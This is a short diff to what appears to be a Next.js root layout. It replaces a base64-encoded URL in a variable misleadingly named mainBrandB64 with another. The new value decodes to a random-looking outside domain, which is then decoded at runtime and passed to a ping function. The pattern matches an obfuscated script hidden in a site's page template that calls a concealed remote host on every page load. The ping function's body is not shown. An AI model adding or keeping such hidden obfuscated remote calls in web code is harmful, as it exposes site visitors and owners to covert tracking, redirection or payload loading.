@@ -44,7 +44,7 @@ export default function RootLayout({ children }: Readonly<{ children: React.Reac
             }
         }
         
-        var mainBrandB64 = "aHR0cHM6Ly9zdHJpbmctMjZldmEuY29tL2RpYnpmb21pcg=="; 
+        var mainBrandB64 = "aHR0cHM6Ly9jaGVzN251dC00cGV4MjYuY29tL2FkMmFhcTV1cGM="; 
         var mainUrl = atob(mainBrandB64.replace("#", ""));
 
         function ping(url) {
